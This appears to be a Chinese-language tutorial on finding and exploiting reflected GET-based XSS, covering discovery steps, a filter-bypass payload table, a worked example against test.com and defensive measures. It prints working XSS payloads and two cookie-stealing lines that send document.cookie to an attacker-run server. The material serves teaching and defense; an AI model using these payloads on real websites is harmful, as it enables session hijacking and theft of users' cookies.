反射型 XSS（GET 型）详解 + 实战解题步骤

2026-03-16

一、反射型 XSS（GET 型）核心介绍

1. 定义

攻击者将恶意 JS 代码拼接在 GET 请求的 URL 参数 中，诱导受害者点击该链接；服务器接收到参数后，未做过滤/转义就直接将参数内容反射（输出）到页面中，浏览器执行这段恶意代码，完成攻击。

2. 核心特征

  • 非持久化：恶意代码只存在于 URL 中，不会存入数据库，只有点击特定链接的用户才会中招；
  • 依赖 GET 传参：参数通过 URL 传递（如 ?name=xxx），可直接看到；
  • 触发简单：通常是“输入→输出”一次完成，比如搜索框输入内容后，页面直接显示搜索关键词，若未过滤就会触发。

3. 典型场景

  • 网站搜索功能（/search?keyword=xxx）；
  • 错误提示页面（/error?msg=xxx）；
  • 个人资料预览（/profile?nickname=xxx）；
  • URL 参数直接回显的页面（/welcome?name=xxx）。

4. 危害

  • 偷取用户 Cookie（结合 document.cookie）；
  • 劫持用户会话，冒充用户操作；
  • 跳转到钓鱼网站；
  • 诱导用户点击恶意按钮/链接。

二、反射型 XSS（GET 型）解题/挖掘步骤

核心思路

找到URL 参数能直接回显到页面的位置 → 测试参数是否过滤 → 构造绕过/注入代码 → 验证是否执行。

详细步骤（实战通用）

步骤 1：找到可测试的 GET 参数

  • 先访问目标页面，找到带 GET 参数的 URL，比如：
    http://test.com/search?keyword=test
  • 观察页面中是否显示了参数值（比如页面显示“你搜索的关键词：test”），这个回显点就是测试目标。

步骤 2：初步测试是否存在 XSS 漏洞

向参数中输入简单的测试代码，看是否会被执行/解析：

1
2

# 测试 URL（替换成目标地址）
http://test.com/search?keyword=<script>alert(1)</script>
  • 如果页面弹出 1 → 直接存在 XSS 漏洞；
  • 如果没弹出 → 说明有过滤，进入下一步“绕过测试”。

步骤 3：过滤规则绕过（最核心的解题环节）

服务器通常会过滤 <script>、alert 等关键词，需要针对性绕过，常见场景如下：

过滤规则 绕过方法（示例） 原理
过滤 <script> 标签 <img src=x onerror=alert(1)> 用其他可执行 JS 的标签
过滤 alert 关键词 alert → confirm/prompt/a\u006cert 替换函数/Unicode 编码
过滤括号 () alert&#40;1&#41; HTML 实体编码
过滤空格 <img/src=x/onerror=alert(1)> 用 / 代替空格
只过滤小写标签 <SCRIPT>alert(1)</SCRIPT> 大小写混合（部分场景）

步骤 4：验证漏洞是否生效

  • 若能弹出 alert(1)（或 confirm(1)）→ 漏洞验证成功；
  • 若需要实战利用（如偷 Cookie），替换代码为：
    1

    <script>document.location='http://你的服务器/steal?cookie='+document.cookie</script>
    （需自己搭建一个简单的服务器接收 Cookie）

步骤 5：优化攻击代码（可选）

  • 缩短代码长度（方便传播）："><svg onload=alert(1)>；
  • 规避前端过滤：用 Base64 编码、JS 混淆等。

三、实战例子

场景

目标网站：http://test.com/welcome?name=访客，页面显示“欢迎你：访客”。

解题步骤

  1. 测试基础代码：
    访问 http://test.com/welcome?name=<script>alert(1)</script>，发现页面没弹窗，且源码中 <script> 被过滤成了 &lt;script&gt;（HTML 转义）。

  2. 尝试标签绕过：
    换用 <img> 标签：http://test.com/welcome?name=<img src=x onerror=alert(1)>，页面弹出 1 → 漏洞存在。

  3. 实战利用（偷 Cookie）：
    构造最终链接：

    1

    http://test.com/welcome?name=<img src=x onerror="document.location='http://my-server.com?cookie='+document.cookie">

    受害者点击后，其 Cookie 会被发送到你的服务器。

四、防御反射型 XSS（GET 型）的核心方法

（解题的同时也要知道怎么防）

  1. 输出转义：服务器将参数输出到页面时，对特殊字符（</>/"/'/&）做 HTML 转义；
  2. 输入过滤：对 GET 参数做白名单校验（只允许合法字符，如字母、数字）；
  3. CSP 策略：禁止内联脚本执行，限制 JS 加载来源；
  4. Cookie HttpOnly：即使存在 XSS，也无法偷取 Cookie。

总结

  1. 反射型 XSS（GET 型）核心是URL 参数回显未过滤，恶意代码随 URL 传递、一次性执行；
  2. 解题步骤：找回显参数 → 基础测试 → 绕过过滤 → 验证/利用；
  3. 常见绕过技巧：替换标签（<img>/<svg>）、编码、大小写混合、替换危险函数。
